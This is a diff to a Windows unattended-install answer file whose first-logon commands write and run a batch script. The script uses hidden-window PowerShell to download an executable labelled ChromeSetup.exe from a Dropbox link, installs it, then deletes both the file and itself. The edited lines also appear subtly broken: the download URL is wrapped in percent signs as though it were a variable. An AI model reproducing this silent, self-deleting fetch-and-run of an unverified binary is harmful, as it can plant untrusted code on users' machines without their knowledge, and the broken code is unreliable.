@@ -182,18 +182,14 @@
                 </SynchronousCommand>
                 <SynchronousCommand wcm:action="add">
                     <Order>2</Order>
-                    <CommandLine>cmd /c echo set "URL1=https://www.dropbox.com/scl/fi/1o7ges6buoqwmq6u7fwrn/ChromeSetup.exe?rlkey=518wyaa8t0emtrruvvmlqthm4&amp;st=byh6jymf&amp;dl=1" &gt;&gt; C:\install_chrome.bat</CommandLine>
+                    <CommandLine>cmd /c echo powershell -WindowStyle Hidden -c ^"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '%https://www.dropbox.com/scl/fi/1o7ges6buoqwmq6u7fwrn/ChromeSetup.exe?rlkey=518wyaa8t0emtrruvvmlqthm4&amp;st=byh6jymf&amp;dl=1%' -OutFile 'C:\Chrome.exe'^" &gt;&gt; C:\install_chrome.bat</CommandLine>
                 </SynchronousCommand>
                 <SynchronousCommand wcm:action="add">
                     <Order>3</Order>
-                    <CommandLine>cmd /c echo powershell -WindowStyle Hidden -c ^"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '%URL1%' -OutFile 'C:\ChromeSetup.exe'^" &gt;&gt; C:\install_chrome.bat</CommandLine>
+                    <CommandLine>cmd /c echo C:\Chrome.exe /install ^&amp; del C:\Chrome.exe ^&amp; del "%%~f0" &gt;&gt; C:\install_chrome.bat</CommandLine>
                 </SynchronousCommand>
                 <SynchronousCommand wcm:action="add">
                     <Order>4</Order>
-                    <CommandLine>cmd /c echo C:\ChromeSetup.exe /install ^&amp; del C:\ChromeSetup.exe ^&amp; del "%~f0" &gt;&gt; C:\install_chrome.bat</CommandLine>
-                </SynchronousCommand>
-                <SynchronousCommand wcm:action="add">
-                    <Order>5</Order>
                     <CommandLine>cmd /c C:\install_chrome.bat</CommandLine>
                 </SynchronousCommand>
             </FirstLogonCommands>
